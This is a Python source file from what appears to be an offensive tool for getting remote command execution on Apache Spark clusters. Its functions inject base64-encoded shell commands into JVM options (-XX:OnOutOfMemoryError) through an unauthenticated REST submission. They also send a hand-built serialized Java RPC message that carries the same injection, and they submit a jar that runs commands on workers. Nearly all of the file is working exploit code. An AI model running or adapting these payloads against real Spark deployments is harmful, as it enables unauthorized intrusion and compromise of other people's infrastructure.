from utils.general import whine
from prettytable import PrettyTable
import struct, sys, subprocess, base64
import distutils.spawn, time


def parseCommandOutput(sClient, interpreterArgs, numWorkers):
    maxNodes = int(sClient.listNodes().size()) - 1
    whine("Found a maximum of %d workers that can be allocated" % maxNodes, "info")
    numWorkers = min(numWorkers, maxNodes)
    whine("Executing command on %d workers" % numWorkers, "info")
    listOutput = sClient.executeCMD(interpreterArgs, numWorkers)
    for i, out in enumerate(listOutput):
        whine("Output of worker %d" % i, "good")
        print(out.decode("utf-8"))


def restCommandExec(sClient, binPath, cmdFormatted, restJarURL, maxMem):
    headers = {"Content-Type": "application/json;charset=UTF-8"}
    payload = {
        "action": "CreateSubmissionRequest",
        "appArgs": ["Test"],
        "clientSparkVersion": "2.4.3",
        "environmentVariables": {"SPARK_ENV_LOADED": "1"},
        "mainClass": "Main",
        "sparkProperties": {
            "spark.driver.supervise": "false",
            "spark.app.name": sClient.appName,
            "spark.submit.deployMode": "cluster",
        },
    }
    if restJarURL == "spark://%s:%s":
        restJarURL = "spark://%s:%s" % (sClient.target, sClient.port)
        payload["sparkProperties"]["spark.jars"] = restJarURL
        payload["sparkProperties"]["spark.driver.extraJavaOptions"] = (
            "-Xmx%sm -XX:OnOutOfMemoryError=echo${IFS}%s${IFS}|base64${IFS}-d|%s"
            % (maxMem.zfill(2), cmdFormatted, binPath)
        )
    else:
        try:
            fqdnJar = restJarURL.split("::")[0]
            mainClass = restJarURL.split("::")[1]
            payload["sparkProperties"]["spark.jars"] = fqdnJar
            payload["mainClass"] = mainClass
        except Exception as err:
            whine(
                "Error parsing URL jar file. Please follow instructions in help page. %s"
                % err,
                "err",
            )
            return None

    payload["appResource"] = payload["sparkProperties"]["spark.jars"]
    payload["sparkProperties"]["spark.master"] = "spark://%s:%s" % (
        sClient.target,
        sClient.restPort,
    )
    url = "http://%s:%s/v1/submissions/create" % (sClient.target, sClient.restPort)
    resp = sClient.sendRestPost(url, payload, headers)

    if not resp is None and resp["success"]:
        whine("Command successfully executed on a random worker", "good")
        return True
    else:
        whine("Something went wrong", "err")
        sys.exit(-1)


def _runLocalCMD(cmd):
    proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
    )
    stdout, stderr = proc.communicate()
    return proc.returncode, stdout, stderr


def scalaCommandExec(sClient, cmdFormatted, numWorkers):
    if distutils.spawn.find_executable("java") is None:
        whine("Could not find java binary in current PATH", "err")
        sys.exit(-1)

    sparkSubmit, sparkArgs = sClient.getAll()
    jarArgs = " --class SimpleApp ./res/SimpleApp.jar %s %s" % (
        cmdFormatted.decode("utf-8"),
        numWorkers,
    )

    cmdLine = "%s %s %s " % (sparkSubmit, sparkArgs, jarArgs)
    whine("Initializing local Spark driver...This can take a little while", "info")
    code, out, err = _runLocalCMD(cmdLine)
    if code == 0:
        whine("Command output\n", "good")
        print(out.decode("utf-8"))
    else:
        whine("Error submitting JAR file or executing code", "err")
        print(err.decode("utf-8"))
    sys.exit()


def blindCommandExec(sClient, binPath, cmdFormatted, maxMem):
    serialID = "\xcd\xc3\xc2\x81N\x03\xff\x02"
    holder = (
        b"\x01\x00\x0c192.168.1.22\x00\x00E\xb1\x01\x00\x0c192.168.1.24\x00\x00\x1b\xa5\x00\x06Master\xac\xed\x00\x05sr\x00:org.apache.spark.deploy.DeployMessages$RegisterApplication\xb3\xbd\x8d\xd3\x06\t\x1f\xef\x02\x00\x02L\x00\x0eappDescriptiont\x000Lorg/apache/spark/deploy/ApplicationDescription;L\x00\x06drivert\x00%Lorg/apache/spark/rpc/RpcEndpointRef;xpsr\x00.org.apache.spark.deploy.ApplicationDescriptionZ"
        + serialID
        + "\x00\nI\x00\x13memoryPerExecutorMBL\x00\x08appUiUrlt\x00\x12Ljava/lang/String;L\x00\x07commandt\x00!Lorg/apache/spark/deploy/Command;L\x00\x10coresPerExecutort\x00\x0eLscala/Option;L\x00\reventLogCodecq\x00~\x00\x07L\x00\x0beventLogDirq\x00~\x00\x07L\x00\x14initialExecutorLimitq\x00~\x00\x07L\x00\x08maxCoresq\x00~\x00\x07L\x00\x04nameq\x00~\x00\x05L\x00\x04userq\x00~\x00\x05xp\x00\x00\x04\x00t\x00\x18http://192.168.1.22:4040sr\x00\x1forg.apache.spark.deploy.Command\x9d}\xbf\r\xfdQj\xbd\x02\x00\x06L\x00\targumentst\x00\x16Lscala/collection/Seq;L\x00\x10classPathEntriesq\x00~\x00\x0bL\x00\x0benvironmentt\x00\x16Lscala/collection/Map;L\x00\x08javaOptsq\x00~\x00\x0bL\x00\x12libraryPathEntriesq\x00~\x00\x0bL\x00\tmainClassq\x00~\x00\x05xpsr\x002scala.collection.immutable.List$SerializationProxy\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x00xpt\x00\x0c--driver-urlt\x001spark://CoarseGrainedScheduler@192.168.1.22:17841t\x00\r--executor-idt\x00\x0f{{EXECUTOR_ID}}t\x00\n--hostnamet\x00\x0c{{HOSTNAME}}t\x00\x07--corest\x00\t{{CORES}}t\x00\x08--app-idt\x00\n{{APP_ID}}t\x00\x0c--worker-urlt\x00\x0e{{WORKER_URL}}sr\x00,scala.collection.immutable.ListSerializeEnd$\x8a\\c[\xf7S\x0bm\x02\x00\x00xpxsq\x00~\x00\x0eq\x00~\x00\x1dxsr\x00 scala.collection.mutable.HashMap\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x00xpw\r\x00\x00\x02\xee\x00\x00\x00\x02\x00\x00\x00\x04\x00t\x00\nSPARK_USERt\x00\x06lambdat\x00\x15SPARK_EXECUTOR_MEMORYt\x00\x051024mxsr\x00!scala.collection.mutable.ArraySeq\x15<=\xd2(I\x0es\x02\x00\x02I\x00\x06length[\x00\x05arrayt\x00\x13[Ljava/lang/Object;xp\x00\x00\x00\x03ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x03t\x00\x19-Dspark.driver.port=17841t\x00&-XX:OnOutOfMemoryError=/tmp/scripts.sht\x00\x07-Xmx"
        + maxMem.zfill(2).encode("utf-8")
        + b'mq\x00~\x00\x1et\x006org.apache.spark.executor.CoarseGrainedExecutorBackendsr\x00\x0bscala.None$FP$\xf6S\xca\x94\xac\x02\x00\x00xr\x00\x0cscala.Option\xfei7\xfd\xdb\x0eft\x02\x00\x00xpq\x00~\x000sr\x00\nscala.Some\x11"\xf2i^\xa1\x8bt\x02\x00\x01L\x00\x01xt\x00\x12Ljava/lang/Object;xq\x00~\x00/sr\x00\x0cjava.net.URI\xac\x01x.C\x9eI\xab\x03\x00\x01L\x00\x06stringq\x00~\x00\x05xpt\x00\x1afile:/C:/tmp/spark-events/xq\x00~\x000q\x00~\x000t\x00\x08testtestt\x00\x06lambdasr\x00.org.apache.spark.rpc.netty.NettyRpcEndpointRefV\xd5\x9fC\xdd\xe7\xe82\x03\x00\x01L\x00\x0fendpointAddresst\x00)Lorg/apache/spark/rpc/RpcEndpointAddress;xr\x00#org.apache.spark.rpc.RpcEndpointRef\xed\x8d\xff\xc5]\x08\xa0\xd2\x02\x00\x03I\x00\nmaxRetriesJ\x00\x0bretryWaitMsL\x00\x11defaultAskTimeoutt\x00!Lorg/apache/spark/rpc/RpcTimeout;xp\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x0b\xb8sr\x00\x1forg.apache.spark.rpc.RpcTimeout\xb5\x84I\xce\xfd\x9bP\x15\x02\x00\x02L\x00\x08durationt\x00*Lscala/concurrent/duration/FiniteDuration;L\x00\x0btimeoutPropq\x00~\x00\x05xpsr\x00(scala.concurrent.duration.FiniteDuration\xf2Z8LLZ\xa8j\x02\x00\x02J\x00\x06lengthL\x00\x04unitt\x00\x1fLjava/util/concurrent/TimeUnit;xr\x00"scala.concurrent.duration.Duration\x97\x9d0tfJI\xf0\x02\x00\x00xp\x00\x00\x00\x00\x00\x00\x00x~r\x00\x1djava.util.concurrent.TimeUnit\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00xr\x00\x0ejava.lang.Enum\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00xpt\x00\x07SECONDSt\x00\x14spark.rpc.askTimeoutsr\x00\'org.apache.spark.rpc.RpcEndpointAddress\xcb_\x95\xe3+}\xc3\xf8\x02\x00\x03L\x00\x04nameq\x00~\x00\x05L\x00\nrpcAddresst\x00!Lorg/apache/spark/rpc/RpcAddress;L\x00\x08toStringq\x00~\x00\x05xpt\x00\tAppClientsr\x00\x1forg.apache.spark.rpc.RpcAddress\xe5\xa2\x067\x80c\xb2\x0f\x02\x00\x02I\x00\x04portL\x00\x04hostq\x00~\x00\x05xp\x00\x00E\xb1t\x00\x0c192.168.1.22t\x00$spark://AppClient@192.168.1.22:17841x'
    )

    whine("Executing command on a random worker", "info")
    cmd = "-XX:OnOutOfMemoryError=echo\t%s\t|base64\t-d|%s" % (
        cmdFormatted.decode("utf-8"),
        binPath,
    )
    cmdSize = struct.pack(">H", len(cmd))

    appNameSize = struct.pack(">H", len(sClient.appName))
    usernameSize = struct.pack(">H", len(sClient.username))

    payload = (
        holder[:1416]
        + cmdSize
        + cmd.encode("utf-8")
        + holder[1456:1728]
        + appNameSize
        + sClient.appName.encode("utf-8")
        + b"t"
        + usernameSize
        + sClient.username.encode("utf-8")
        + holder[1747:]
    )
    payloadSize = struct.pack(">I", len(payload))
    payloadSize13 = struct.pack(">I", len(payload) + 13)
    nonce = b"\x00\x00\x00\x00" + payloadSize13 + b"\x09" + payloadSize

    resp = sClient.sendRawMessage(nonce, payload, wait_time=20)
    if not resp is None and "RegisteredApplication" in resp.decode("utf-8", "ignore"):
        whine("Positive response from the Master", "good")
        whine(
            "If cmd failed, adjust the -m param to make sure to case an out of memory error",
            "info",
        )
    else:
        whine("Something went wrong", "err")
